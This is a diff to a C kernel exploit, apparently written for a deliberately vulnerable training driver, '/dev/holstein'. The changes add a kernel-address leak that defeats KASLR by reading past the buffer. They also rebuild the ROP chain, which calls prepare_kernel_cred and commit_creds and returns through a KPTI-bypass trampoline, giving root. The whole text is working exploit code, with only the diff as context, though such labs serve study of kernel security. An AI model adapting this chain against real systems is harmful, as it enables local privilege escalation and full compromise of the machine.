@@ -4,14 +4,14 @@
 #include <unistd.h>
 #include <string.h>
 
+unsigned long kernel_base;
 unsigned long user_cs, user_ss, user_rsp, user_rflags;
-#define prepare_kernel_cred 0xffffffff8106e240
-#define commit_creds        0xffffffff8106e390
-#define rop_pop_rdi               0xffffffff8127bbdc
-#define rop_pop_rcx               0xffffffff8132cdd3
-#define rop_mov_rdi_rax_rep_movsq 0xffffffff8160c96b
-#define rop_swapgs                0xffffffff8160bf7e
-#define rop_iretq                 0xffffffff810202af
+#define prepare_kernel_cred (kbase + 0x6e240)
+#define commit_creds        (kbase + 0x6e390)
+#define rop_pop_rdi               (kbase + 0x27bbdc)
+#define rop_pop_rcx               (kbase + 0x32cdd3)
+#define rop_mov_rdi_rax_rep_movsq (kbase + 0x60c96b)
+#define rop_bypass_kpti           (kbase + 0x800e26)
 
 void fatal(const char *msg) {
     perror(msg);
@@ -43,6 +43,10 @@ int main() {
     if (fd == -1) fatal("open(\"/dev/holstein\")");
 
     char buf[0x800] = {};
+    read(fd, buf, 0x410);
+    unsigned long kbase = *(unsigned long*) &buf[0x408] - (0xffffffff8113d33c-0xffffffff81000000);
+    printf("Kernel base: %p\n", (void *) kbase);
+
     memset(buf, 'A', 0x408);
     unsigned long* chain = (unsigned long*) &buf[0x408];
     *chain++ = rop_pop_rdi;
@@ -52,9 +56,10 @@ int main() {
     *chain++ = 0;
     *chain++ = rop_mov_rdi_rax_rep_movsq;
     *chain++ = commit_creds;
-    *chain++ = rop_swapgs;
-    *chain++ = rop_iretq;
-    *chain++ = (unsigned long) &win;
+    *chain++ = rop_bypass_kpti;
+    *chain++ = 0xdeadbeefcafebabe;
+    *chain++ = 0xdeadbeefcafebabe;
+    *chain++ = (unsigned long) win;
     *chain++ = user_cs;
     *chain++ = user_rflags;
     *chain++ = user_rsp;
